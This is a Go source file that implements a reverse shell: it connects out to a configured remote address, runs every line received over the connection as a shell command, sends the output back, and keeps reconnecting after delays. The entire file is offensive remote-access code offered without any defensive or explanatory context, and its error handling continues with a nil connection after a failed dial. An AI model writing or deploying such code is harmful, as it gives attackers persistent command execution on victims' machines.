package main

import (
	"net"
	"bufio"
	"time"
)

func ReverseShell(config Config) {
	conn, err := net.Dial(config.Proto, config.Address)
	if err != nil {
		if conn != nil {
			conn.Close()
		}

		Reconnect(config)
	}

	reader := bufio.NewReader(conn)
	for {
		stdin, err := reader.ReadBytes('\n')
		if err != nil {
			conn.Close()
			return
		}

		output := Shell(config.Shell, stdin)
		conn.Write(output)
	}

	Reconnect(config)
}

func Reconnect(config Config) {
	time.Sleep(config.Reconnect)
	ReverseShell(config)
}